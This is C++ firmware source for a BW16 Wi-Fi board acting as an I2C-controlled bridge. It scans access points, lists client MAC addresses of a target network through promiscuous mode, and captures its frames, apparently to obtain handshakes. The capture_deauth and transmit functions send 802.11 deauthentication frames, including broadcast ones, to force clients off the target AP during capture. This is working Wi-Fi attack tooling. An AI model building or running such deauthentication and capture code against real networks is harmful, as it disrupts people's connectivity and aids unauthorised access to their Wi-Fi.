/* SPDX-License-Identifier: GPL-3.0-or-later
 * Isolated I2C bridge using the unchanged 4.4 controller/radio/capture codec.
 * I2C0 slave 0x42: PA26 SDA, PA25 SCL. No UART commands or replies.
 */
#include <Arduino.h>
#include <WiFi.h>
#include <wifi_conf.h>
extern "C" {
#include <FreeRTOS.h>
#include <task.h>
}
#include "bw16_native.h"
#include "bw16_pcap.h"
#include "radio_amebad_319.h"
#include "bw16_i2c_link.h"
#include "bw16_i2c_slave.h"

static BwnController controller;
static BwnAp scan_buffer[BWN_MAX_APS];
static volatile unsigned scan_count;
static unsigned scan_read;
static volatile bool scan_inflight, scan_done;
static uint8_t client_buffer[BWN_MAX_CLIENTS][6], observed_bssid[6];
static volatile unsigned client_count;
static unsigned client_read;
static volatile bool observing;
static bool wifi_ready;

/* The Wi-Fi callback only filters and copies into this fixed ring. */
#define CAPTURE_QUEUE_SIZE 8U
static BwcPacket capture_queue[CAPTURE_QUEUE_SIZE], capture_packet;
static char capture_line[BWC_LINE_SIZE];
static uint8_t capture_bssid[6], capture_channel;
static uint32_t capture_session, capture_started_us, capture_started_ms;
static volatile uint32_t capture_accepted, capture_dropped;
static uint32_t capture_emitted, capture_encode_dropped;
static volatile unsigned capture_head, capture_tail, capture_queued;
static volatile bool capturing;
static bool capture_beacon_seen;

#define LINK_LOST_MS 3000U
#define CAPTURE_NORMAL_TX_LIMIT 4096U
/* One setup-time allocation uses the SDK reserved250KB RTOS heap. */
static BwiServer* link_server;
static uint32_t allocation_fault_session;
static uint32_t native_session, last_link_ms;
static bool output_muted, scan_holds_ready;

static void link_receive(const uint8_t frame[BWI_HW_FRAME_SIZE]) {
    /* IRQ context; main wraps all matching server accesses in critical sections. */
    if(link_server) {
        if(bwi_server_receive(link_server, frame, BWI_FRAME_SIZE)) last_link_ms = millis();
    } else {
        /* Still answer a fresh OPEN with FAULT if startup allocation failed. */
        BwiFrame request;
        if(bwi_decode(frame, BWI_FRAME_SIZE, &request) && request.op == BWI_OP_OPEN &&
           request.session && !request.sequence && !request.ack && !request.length)
            allocation_fault_session = request.session;
    }
}
static void link_response(uint8_t frame[BWI_HW_FRAME_SIZE]) {
    if(link_server) bwi_server_response(link_server, frame);
    else {
        BwiFrame response = {}; response.op = BWI_FLAG_FAULT;
        response.session = allocation_fault_session; bwi_encode(frame, &response);
    }
}
static bool transport_allowed() {
    taskENTER_CRITICAL();
    const bool allowed = link_server && native_session && native_session == link_server->session &&
        link_server->ready && !link_server->open_pending && !link_server->stop_pending &&
        !link_server->fault && (uint32_t)(millis() - last_link_ms) < LINK_LOST_MS;
    taskEXIT_CRITICAL();
    return allowed;
}
static bool enqueue_line(const char* line) {
    const size_t length = strlen(line);
    bool accepted = false;
    taskENTER_CRITICAL();
    if(link_server && !output_muted && native_session && native_session == link_server->session && !link_server->open_pending) {
        accepted = bwi_server_enqueue_line(link_server, line, length);
        if(!accepted && !link_server->fault) bwi_server_set_fault(link_server, true);
    }
    taskEXIT_CRITICAL();
    return accepted;
}
static void emit_line(void*, const char* line) { enqueue_line(line); }
static bool capture_has_output_room() {
    taskENTER_CRITICAL();
    /* Keep the NORMAL queue under4KB even after the next largest record.
     * This leaves >28KB for all eight queued records plus STOP/DONE/stats. */
    const bool room = bwi_server_pending(link_server) + BWC_LINE_SIZE <= CAPTURE_NORMAL_TX_LIMIT;
    taskEXIT_CRITICAL();
    return room;
}

static rtw_result_t scan_callback(rtw_scan_handler_result_t* result) {
    if(!result) return RTW_SUCCESS;
    taskENTER_CRITICAL();
    if(scan_inflight) {
        if(result->scan_complete == RTW_TRUE) scan_done = true;
        else if(scan_count < BWN_MAX_APS) {
            const rtw_scan_result_t* ap = &result->ap_details;
            BwnAp* dest = &scan_buffer[scan_count];
            memset(dest, 0, sizeof(*dest));
            unsigned length = ap->SSID.len > 32 ? 32 : ap->SSID.len;
            memcpy(dest->ssid, ap->SSID.val, length);
            memcpy(dest->mac, ap->BSSID.octet, 6);
            dest->channel = ap->channel; dest->rssi = ap->signal_strength;
            ++scan_count;
        }
    }
    taskEXIT_CRITICAL();
    return RTW_SUCCESS;
}
static bool scan_begin(void*) {
    if(!wifi_ready || !transport_allowed()) return false;
    taskENTER_CRITICAL();
    if(scan_inflight) { taskEXIT_CRITICAL(); return false; }
    scan_count = scan_read = 0; scan_done = false; scan_inflight = true;
    taskEXIT_CRITICAL();
    if(wifi_scan_networks(scan_callback, NULL) != RTW_SUCCESS) {
        taskENTER_CRITICAL(); scan_inflight = false; taskEXIT_CRITICAL();
        return false;
    }
    return true;
}
static void drain_scan() {
    /* The Wi-Fi task owns callback writes; only this Arduino thread calls core. */
    for(unsigned budget = 0; budget < BWN_MAX_APS; ++budget) {
        BwnAp ap; bool have = false, complete = false;
        taskENTER_CRITICAL();
        if(scan_read < scan_count) { ap = scan_buffer[scan_read++]; have = true; }
        else if(scan_inflight && scan_done) { scan_inflight = false; complete = true; }
        taskEXIT_CRITICAL();
        if(have) bwn_scan_result(&controller, &ap);
        else { if(complete) bwn_scan_complete(&controller, true); break; }
    }
}
static void promisc_callback(unsigned char* frame, unsigned int length, void*) {
    uint8_t mac[6];
    taskENTER_CRITICAL();
    if(observing && transport_allowed() && bwn_client_from_frame(frame, length, observed_bssid, mac)) {
        bool duplicate = false;
        for(unsigned i = 0; i < client_count; ++i)
            if(!memcmp(client_buffer[i], mac, 6)) { duplicate = true; break; }
        if(!duplicate && client_count < BWN_MAX_CLIENTS) memcpy(client_buffer[client_count++], mac, 6);
    }
    taskEXIT_CRITICAL();
}
static void drain_clients() {
    for(unsigned budget = 0; budget < BWN_MAX_CLIENTS; ++budget) {
        uint8_t mac[6]; bool have = false;
        taskENTER_CRITICAL();
        if(client_read < client_count) { memcpy(mac, client_buffer[client_read++], 6); have = true; }
        taskEXIT_CRITICAL();
        if(!have) break;
        bwn_client_result(&controller, mac);
    }
}
static bool set_channel(void*, uint8_t channel) {
    return wifi_ready && transport_allowed() && wifi_set_channel(channel) == RTW_SUCCESS && transport_allowed();
}
static bool observe_begin(void*, const BwnAp* ap) {
    if(!set_channel(NULL, ap->channel)) return false;
    taskENTER_CRITICAL();
    client_count = client_read = 0; memcpy(observed_bssid, ap->mac, 6); observing = true;
    taskEXIT_CRITICAL();
    if(wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1) != RTW_SUCCESS) {
        taskENTER_CRITICAL(); observing = false; taskEXIT_CRITICAL();
        return false;
    }
    return true;
}
static void observe_end(void*) {
    taskENTER_CRITICAL(); observing = false; taskEXIT_CRITICAL();
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    drain_clients();
}
static void capture_callback(unsigned char* frame, unsigned int length, void*) {
    const uint32_t elapsed = (uint32_t)(micros() - capture_started_us);
    taskENTER_CRITICAL();
    if(capturing && transport_allowed() && capture_accepted < BWN_CAPTURE_PACKETS &&
       (uint32_t)(millis() - capture_started_ms) < BWN_CAPTURE_MS) {
        if(length > BWC_MAX_FRAME) {
            ++capture_dropped; taskEXIT_CRITICAL(); return;
        }
        const uint8_t kind = bwc_classify(frame, length, capture_bssid);
        if(kind && !(kind == 1 && capture_beacon_seen)) {
            if(capture_queued == CAPTURE_QUEUE_SIZE) {
                ++capture_dropped;
            } else {
                BwcPacket* packet = &capture_queue[capture_tail];
                packet->session = capture_session; packet->sequence = capture_accepted;
                packet->usec = elapsed; packet->length = (uint16_t)length; packet->kind = kind;
                memcpy(packet->data, frame, length);
                capture_tail = (capture_tail + 1U) % CAPTURE_QUEUE_SIZE;
                ++capture_queued; ++capture_accepted;
                if(kind == 1) capture_beacon_seen = true;
            }
        }
    }
    taskEXIT_CRITICAL();
}
static void capture_progress() {
    uint32_t dropped; bool complete;
    taskENTER_CRITICAL();
    dropped = capture_dropped;
    complete = capture_accepted >= BWN_CAPTURE_PACKETS && capture_queued == 0;
    taskEXIT_CRITICAL();
    bwn_capture_progress(&controller, capture_emitted, dropped + capture_encode_dropped, complete);
}
static bool drain_capture(bool force) {
    if(!force && !capture_has_output_room()) { capture_progress(); return false; }
    bool have = false;
    taskENTER_CRITICAL();
    if(capture_queued) {
        capture_packet = capture_queue[capture_head];
        capture_head = (capture_head + 1U) % CAPTURE_QUEUE_SIZE;
        --capture_queued; have = true;
    }
    taskEXIT_CRITICAL();
    if(have) {
        if(bwc_encode(capture_line, sizeof(capture_line), &capture_packet)) {
            if(enqueue_line(capture_line)) ++capture_emitted; else ++capture_encode_dropped;
        } else ++capture_encode_dropped;
    }
    capture_progress();
    return have;
}
static bool capture_begin(void*, const BwnAp* ap, uint32_t session) {
    if(!set_channel(NULL, ap->channel)) return false;
    taskENTER_CRITICAL();
    capture_head = capture_tail = capture_queued = 0;
    capture_accepted = capture_dropped = capture_emitted = capture_encode_dropped = 0;
    capture_beacon_seen = false; memcpy(capture_bssid, ap->mac, 6); capture_channel = ap->channel;
    capture_session = session; capture_started_us = micros();
    capture_started_ms = controller.started; capturing = true;
    taskEXIT_CRITICAL();
    if(wifi_set_promisc(RTW_PROMISC_ENABLE_2, capture_callback, 1) != RTW_SUCCESS) {
        taskENTER_CRITICAL(); capturing = false; capture_queued = 0; taskEXIT_CRITICAL();
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
        return false;
    }
    return true;
}
static void capture_end(void*) {
    taskENTER_CRITICAL(); capturing = false; taskEXIT_CRITICAL();
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    /* No callback can enqueue now. Finish each bounded line before DONE. */
    for(unsigned i = 0; i < CAPTURE_QUEUE_SIZE && drain_capture(true); ++i) {}
    capture_progress();
}
static unsigned capture_deauth(void*, const BwnAp* ap) {
    static const uint8_t destination[6] = {255, 255, 255, 255, 255, 255};
    static const uint16_t reasons[3] = {1, 4, 16};
    unsigned attempts = 0;
    for(unsigned i = 0; i < 3; ++i) {
        /* Receiver stays armed; no channel switch, reinitialization or repeat burst. */
        if(!wifi_ready || !transport_allowed() || !capturing || controller.state != BwnCapture ||
           !controller.capture_with_deauth || controller.capture_complete ||
           controller.target_count != 1 || ap != &controller.targets[0] ||
           capture_session != controller.capture_session || ap->channel != capture_channel ||
           memcmp(ap->mac, capture_bssid, 6) || capture_accepted >= BWN_CAPTURE_PACKETS ||
           (uint32_t)(millis() - capture_started_ms) >= BWN_CAPTURE_DEAUTH_MS) break;
        bwn_radio_deauth(ap->mac, destination, reasons[i]);
        ++attempts;
    }
    return attempts; /* API submissions, not over-the-air success or a captured handshake. */
}
static void transmit(void*, const uint8_t source[6], const uint8_t dest[6], uint16_t reason) {
    /* Channel changes may block inside the vendor API. Recheck wall-clock time
     * immediately before every submission, as well as the core's tick guard. */
    if(!transport_allowed() || (uint32_t)(millis() - controller.started) >= BWN_OPERATION_MS) return;
    bwn_radio_deauth(source, dest, reason);
}

static const BwnIo controller_io = {emit_line, scan_begin, observe_begin, observe_end, set_channel, transmit,
                                   capture_begin, capture_end, capture_deauth};
static void service_link() {
    if(!link_server) return;
    uint32_t session = 0; bool opened, stopped;
    taskENTER_CRITICAL();
    opened = bwi_server_take_open(link_server);
    if(opened) { session = link_server->session; native_session = 0; output_muted = true; }
    taskEXIT_CRITICAL();
    if(opened) {
        /* A fresh host cannot inherit an active operation, partial command,
         * scan index, target, capture session, or old-session output. */
        bwn_stop(&controller);
        bwn_init(&controller, &controller_io, NULL);
        taskENTER_CRITICAL();
        output_muted = false;
        if(session == link_server->session && !link_server->open_pending) {
            native_session = session;
            scan_holds_ready = scan_inflight;
            bwi_server_set_ready(link_server, !scan_holds_ready);
        }
        taskEXIT_CRITICAL();
    }
    taskENTER_CRITICAL();
    if(native_session && native_session == link_server->session && !link_server->fault &&
       (uint32_t)(millis() - last_link_ms) >= LINK_LOST_MS)
        bwi_server_set_fault(link_server, true);
    stopped = bwi_server_take_stop(link_server);
    session = link_server->session;
    taskEXIT_CRITICAL();
    if(stopped) {
        bwn_stop(&controller);
        controller.rx_used = 0; controller.rx_discard = false;
        taskENTER_CRITICAL();
        if(native_session == session && session == link_server->session) {
            scan_holds_ready = scan_inflight;
            bwi_server_set_ready(link_server, !scan_holds_ready);
        }
        taskEXIT_CRITICAL();
    }
    taskENTER_CRITICAL();
    /* The SDK scan callback has no cancellable per-scan token. Keep READY low
     * until an older scan finishes, so its results cannot enter a new scan. */
    if(scan_holds_ready && !scan_inflight && native_session == link_server->session) {
        scan_holds_ready = false; scan_done = false; scan_count = scan_read = 0;
        bwi_server_set_ready(link_server, true);
    }
    taskEXIT_CRITICAL();
}
void setup() {
    /* No Serial1 initialization, UART pin mux, or UART command ingress. */
    /* SDK heap_5 adds a32-byte block header and rounds to32-byte alignment.
     * Its OOM hook never returns. Skip obvious shortages; aggregate free bytes
     * cannot guarantee a contiguous block if the SDK heap is fragmented. */
    if(!link_server && xPortGetFreeHeapSize() >= sizeof(BwiServer) + 64U)
        link_server = (BwiServer*)pvPortMalloc(sizeof(BwiServer));
    bwi_server_init(link_server); allocation_fault_session = 0;
    native_session = 0; output_muted = scan_holds_ready = false;
    bwn_init(&controller, &controller_io, NULL);
    if(!link_server) {
        wifi_ready = false;
        bwi_hw_begin(link_receive, link_response);
        return;
    }
    const int wifi_result = wifi_on(RTW_MODE_STA);
    wifi_ready = wifi_result == RTW_SUCCESS || wifi_result == 1;
    last_link_ms = millis();
    bwi_hw_begin(link_receive, link_response);
}
void loop() {
    bwi_hw_poll(millis());
    service_link();
    /* One complete command per iteration keeps control/deadline work bounded. */
    BwiCommand command; bool have = false;
    taskENTER_CRITICAL();
    if(transport_allowed()) have = bwi_server_take_command(link_server, &command);
    taskEXIT_CRITICAL();
    if(have) {
        for(unsigned i = 0; i < command.length && transport_allowed(); ++i)
            bwn_feed(&controller, (uint8_t)command.data[i], millis());
    }
    service_link();
    drain_scan(); drain_clients();
    if(controller.state == BwnCapture && transport_allowed()) drain_capture(false);
    bwn_tick(&controller, millis());
    service_link();
    delay(1);
}
